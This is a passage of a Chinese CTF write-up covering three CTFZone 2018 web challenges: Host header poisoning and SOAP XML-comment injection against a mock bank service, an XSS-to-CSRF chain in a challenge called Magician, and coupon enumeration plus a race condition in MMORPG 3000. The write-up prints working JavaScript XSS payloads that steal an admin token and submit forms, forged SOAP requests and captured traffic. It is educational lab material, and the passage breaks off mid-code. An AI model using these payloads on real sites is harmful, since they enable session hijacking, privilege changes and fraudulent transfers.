class=\"comment\">&lt;amount xsi:type=\"xsd:float\"&gt; </span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">amount</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:float\"</span>&gt;</span> (Amount) <span class=\"tag\">&lt;/<span class=\"name\">amount</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">token</span> <span class=\"attr\">xsi:type</span>=<span class=\"string\">\"xsd:string\"</span>&gt;</span> [SECRET SERVER TOKEN] <span class=\"tag\">&lt;/<span class=\"name\">token</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后开burp跑就行。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803174532.png\" alt=\"\"></p>\n</li>\n<li><p>解法2：Host header poisoning</p>\n<p>从上图，我们可以看到当前Host是<code>web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one</code></p>\n<p>修改该Host为我们的vps_ip,并在我们的vps上创建<code>/api/bankservice.wsdl.php</code>文件，然后发包，监听80端口。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803181237.png\" alt=\"\"></p>\n<p>监听端口:</p>\n<blockquote>\n<p>ngrep -q -d eth0 -W byline port 80</p>\n</blockquote>\n<p>抓包结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [A]</span><br><span class=\"line\">HTTP/1.1 200 OK.</span><br><span class=\"line\">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class=\"line\">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class=\"line\">X-Powered-By: PHP/5.4.16.</span><br><span class=\"line\">Content-Length: 2907.</span><br><span class=\"line\">Connection: close.</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;wsdl:definitions name=&quot;Bank&quot;</span><br><span class=\"line\">             targetNamespace=&quot;urn:Bank&quot;</span><br><span class=\"line\">             xmlns:tns=&quot;urn:Bank&quot;</span><br><span class=\"line\">             xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;</span><br><span class=\"line\">             xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class=\"line\">             xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span><br><span class=\"line\">             xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span><br><span class=\"line\">             xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;BalanceRequest&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;BalanceResponse&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;internalTransferRequest&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;message name=&quot;internalTransferResponse&quot;&gt;</span><br><span class=\"line\">        &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;</span><br><span class=\"line\">        &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;</span><br><span class=\"line\">    &lt;/message&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;portType name=&quot;BankServicePort&quot;&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class=\"line\">            &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;</span><br><span class=\"line\">            &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class=\"line\">            &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;</span><br><span class=\"line\">            &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">    &lt;/portType&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;</span><br><span class=\"line\">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;requestBalance&quot;&gt;</span><br><span class=\"line\">            &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;</span><br><span class=\"line\">            &lt;input&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/input&gt;</span><br><span class=\"line\">            &lt;output&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/output&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">        &lt;operation name=&quot;internalTransfer&quot;&gt;</span><br><span class=\"line\">            &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;</span><br><span class=\"line\">            &lt;input&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/input&gt;</span><br><span class=\"line\">            &lt;output&gt;</span><br><span class=\"line\">                &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;</span><br><span class=\"line\">            &lt;/output&gt;</span><br><span class=\"line\">        &lt;/operation&gt;</span><br><span class=\"line\">    &lt;/b</span><br><span class=\"line\"></span><br><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46038 [AP]</span><br><span class=\"line\">inding&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;wsdl:service name=&quot;BankService&quot;&gt;</span><br><span class=\"line\">        &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;</span><br><span class=\"line\">            &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;</span><br><span class=\"line\">        &lt;/wsdl:port&gt;</span><br><span class=\"line\">    &lt;/wsdl:service&gt;</span><br><span class=\"line\">&lt;/wsdl:definitions&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class=\"line\">POST /api/bankservice.php HTTP/1.1.</span><br><span class=\"line\">Host: 123.207.90.143.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class=\"line\">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class=\"line\">Content-Length: 869.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class=\"line\">      &lt;SOAP-ENV:Body&gt;</span><br><span class=\"line\">        &lt;ns1:internalTransfer&gt;</span><br><span class=\"line\">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class=\"line\">&lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;.2652.&lt;/sender_wallet_num&gt;&lt;!--&lt;/receiver_wallet_num&gt;</span><br><span class=\"line\">          &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/sender_wallet_num&gt;</span><br><span class=\"line\">          &lt;amount xsi:type=&quot;xsd:float&quot;&gt;--&gt;&lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class=\"line\">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class=\"line\">        &lt;/ns1:internalTransfer&gt;</span><br><span class=\"line\">      &lt;/SOAP-ENV:Body&gt;</span><br><span class=\"line\">    &lt;/SOAP-ENV:Envelope&gt;</span><br><span class=\"line\">   </span><br><span class=\"line\">T 10.135.89.224:80 -&gt; 18.184.147.62:46040 [AP]</span><br><span class=\"line\">HTTP/1.1 404 Not Found.</span><br><span class=\"line\">Date: Fri, 03 Aug 2018 10:08:43 GMT.</span><br><span class=\"line\">Server: Apache/2.4.6 (CentOS) PHP/5.4.16.</span><br><span class=\"line\">Content-Length: 217.</span><br><span class=\"line\">Keep-Alive: timeout=5, max=100.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">Content-Type: text/html; charset=iso-8859-1.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class=\"line\">&lt;html&gt;&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;The requested URL /api/bankservice.php was not found on this server.&lt;/p&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>这样我们就拿到了token，然后就可以愉快的转账了。</p>\n<p>直接按这个发这个包即可:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">T 18.184.147.62:46040 -&gt; 10.135.89.224:80 [AP]</span><br><span class=\"line\">POST /api/bankservice.php HTTP/1.1.</span><br><span class=\"line\">Host: 123.207.90.143.</span><br><span class=\"line\">Connection: Keep-Alive.</span><br><span class=\"line\">User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.</span><br><span class=\"line\">Content-Type: application/soap+xml; charset=utf-8; action=&quot;internalTransferAction&quot;.</span><br><span class=\"line\">Content-Length: 869.</span><br><span class=\"line\">.</span><br><span class=\"line\">&lt;SOAP-ENV:Envelope SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;urn:Bank&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;</span><br><span class=\"line\">      &lt;SOAP-ENV:Body&gt;</span><br><span class=\"line\">        &lt;ns1:internalTransfer&gt;</span><br><span class=\"line\">          &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1340&lt;/receiver_wallet_num&gt;.</span><br><span class=\"line\">\t\t &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;2652&lt;/sender_wallet_num&gt;</span><br><span class=\"line\">\t\t &lt;amount xsi:type=&quot;xsd:float&quot;&gt;750000&lt;/amount&gt;</span><br><span class=\"line\">          &lt;token xsi:type=&quot;xsd:token&quot;&gt;somesupertokenkey1235555&lt;/token&gt;</span><br><span class=\"line\">        &lt;/ns1:internalTransfer&gt;</span><br><span class=\"line\">      &lt;/SOAP-ENV:Body&gt;</span><br><span class=\"line\">    &lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"Magician\"><a href=\"#Magician\" class=\"headerlink\" title=\"Magician\"></a>Magician</h2><ol>\n<li><p>从support.php可知该题应该是XSS。修改<em>Link to Profile</em>可以判断后台bot使用<em>Firefox 61.0</em></p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803210045.png\" alt=\"\"></p>\n<p>vps日志显示如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET / HTTP/1.1&quot; 200 65 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br><span class=\"line\">35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xss漏洞</p>\n<p>uuid存在反射型xss,限制长度36个字符</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803211936.png\" alt=\"\"></p>\n</li>\n<li><p>how to get flag</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803212218.png\" alt=\"\"></p>\n<p>这里需要管理员将<code>Status</code>修改为<code>Premium</code></p>\n</li>\n<li><p>思路：</p>\n<p>CSP如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: style-src &apos;self&apos; &apos;unsafe-inline&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</span><br><span class=\"line\">X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class=\"line\">X-XSS-Protection: 1; mode=block</span><br></pre></td></tr></table></figure>\n<p>由于后台使用Firefox,所以<code>X-XSS-Protections</code> 没有作用。</p>\n<p>通过XSRF修改状态。</p>\n</li>\n<li><p>解法1：</p>\n<p>payload如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, `</span><br><span class=\"line\">        $.get(&quot;manage.php&quot;, function(data)&#123;    </span><br><span class=\"line\">                var x = /name=&quot;token&quot; value=&quot;([^&quot;]+)/.exec(data);</span><br><span class=\"line\">                $.post(&quot;manage.php&quot;, &#123;user_uuid: &quot;86dced2a-0305-42ed-a13c-f0c2e6079805&quot;, token: x[1], status: &quot;premium&quot;&#125;); </span><br><span class=\"line\">         &#125;);</span><br><span class=\"line\">   `);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>含义:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.open(&apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;svg/onload=$.globalEval(name)&apos;, &lt;long payload&gt;)</span><br></pre></td></tr></table></figure>\n<p>将 window.name 设置为<code>&lt;long payload&gt;</code>。</p>\n<p>将该html放在vps上，然后提交即可。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803213031.png\" alt=\"\"></p>\n<p>getflag</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803212919.png\" alt=\"\"></p>\n</li>\n<li><p>解法2:</p>\n<p>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&quot;&gt;&lt;iframe onload=srcdoc=window.name&gt;</span><br></pre></td></tr></table></figure>\n<p><code>iframe</code>在使用参数<code>srcdoc</code>加载的时候，会被当做同一个源。</p>\n<p>测试，在Firefox下测试</p>\n<p>打开Firefox,在控制台中输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.name=&apos;&lt;script&gt;alert(&quot;This is XSS!&quot;)&lt;/scrip&apos;+&apos;t&gt;&apos;;</span><br></pre></td></tr></table></figure>\n<p>接下来一次在控制台中输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>\n<p>发现成功弹窗户。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803214831.png\" alt=\"\"></p>\n<p>在次输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>\n<p>我们会发现，再不添加<code>srcdoc</code>参数的情况下，不在弹窗。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803214950.png\" alt=\"\"></p>\n<p>getflag:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.name = `</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.frameElement.onload=null;</span><br><span class=\"line\">console.log(window.parent.document.body.innerHTML);</span><br><span class=\"line\">function elo()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">document.getElementById(&apos;cudo&apos;).onload=null;</span><br><span class=\"line\">r = document.getElementById(&apos;cudo&apos;).contentWindow.document;</span><br><span class=\"line\">r.getElementsByName(&apos;user_uuid&apos;)[0].value = &apos;dbb306dd-28c1-4333-88ba-9588842f08e0&apos;;</span><br><span class=\"line\">r.getElementsByName(&apos;status&apos;)[0].value = &apos;premium&apos;;</span><br><span class=\"line\">r.getElementById(&apos;user_manage&apos;).submit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">`</span><br><span class=\"line\">window.name += &apos;&lt;/scrip&apos;+&apos;t&gt;&lt;iframe src=&quot;/manage.php&quot; onload=&quot;elo()&quot; id=&quot;cudo&quot;&gt;&apos;;</span><br><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"MMORPG-3000\"><a href=\"#MMORPG-3000\" class=\"headerlink\" title=\"MMORPG 3000\"></a>MMORPG 3000</h2><ol>\n<li><p>注册登录</p>\n</li>\n<li><p>在<code>Donate</code>页面获取免费武器。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803220511.png\" alt=\"\"></p>\n<p>图片url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png</span><br></pre></td></tr></table></figure>\n<p>其中：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803220606.png\" alt=\"\"></p>\n<p>此时，userid为860。</p>\n</li>\n<li><p>获取更多<code>coupon</code></p>\n<p>根据上边得到结果，我们可以测试一下 <code>859</code></p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221240.png\" alt=\"\"></p>\n<p>得到url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png</span><br></pre></td></tr></table></figure>\n<p>访问该url:</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221334.png\" alt=\"\"></p>\n<p>得到新的<code>Coupon</code></p>\n<blockquote>\n<p>f598109a-942c</p>\n</blockquote>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221422.png\" alt=\"\"></p>\n<p>成功长了1分。</p>\n<p>这时候，测试<code>1</code>.</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221713.png\" alt=\"\"></p>\n<p>得到url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221807.png\" alt=\"\"></p>\n<p>然后就可以再次得到1337分，并升级。</p>\n</li>\n<li><p>到达30级，新的问题。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221945.png\" alt=\"\"></p>\n<p>无法继续升级。</p>\n</li>\n<li><p>条件竞争。</p>\n<p>这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function levelup() &#123;</span><br><span class=\"line\">    balance &gt; 10:</span><br><span class=\"line\">    是:</span><br><span class=\"line\">    \tlevel &gt; 30:</span><br><span class=\"line\">    \t是:</span><br><span class=\"line\">    \t\texit</span><br><span class=\"line\">    \t否:</span><br><span class=\"line\">    \t\tlevel++                 |</span><br><span class=\"line\">    \t\tbalance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 </span><br><span class=\"line\">    \t\tinsert into table       | </span><br><span class=\"line\">    否:</span><br><span class=\"line\">    \texit</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>并发方案1：</p>\n<p>创建1个账号，获取足够的balance。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span 